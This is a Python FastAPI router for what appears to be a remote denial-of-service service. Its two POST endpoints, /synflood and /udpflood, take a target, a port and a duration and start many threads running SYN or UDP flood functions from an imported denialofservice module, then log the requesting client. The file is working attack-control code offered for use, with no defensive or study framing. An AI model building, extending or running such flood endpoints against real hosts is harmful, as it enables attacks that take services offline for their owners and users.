from fastapi import APIRouter, Request
from denialofservice import Layer4
from globals import NUMBER_OF_THREADS
from threading import Thread
from Log import log

router = APIRouter()

@router.post("/synflood")
async def read_parameters(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.SYN_Flood, args=(target, port, time,))
            t.start()
        log.info(f"{target}:{port} SYN-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target}:{port} SYN-Flood from {request.client.host} for {time} seconds could not be triggered")

@router.post("/udpflood")
async def read_parameters(time: int, target: str, port: int, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer4.UDP_Flood, args=(target, port, time,))
            t.start()
        log.info(f"{target}:{port} UDP-Flooded from {request.client.host} for {time} seconds")
    except:
        log.warning(f"{target}:{port} UDP-Flood from {request.client.host} for {time} seconds could not be triggered")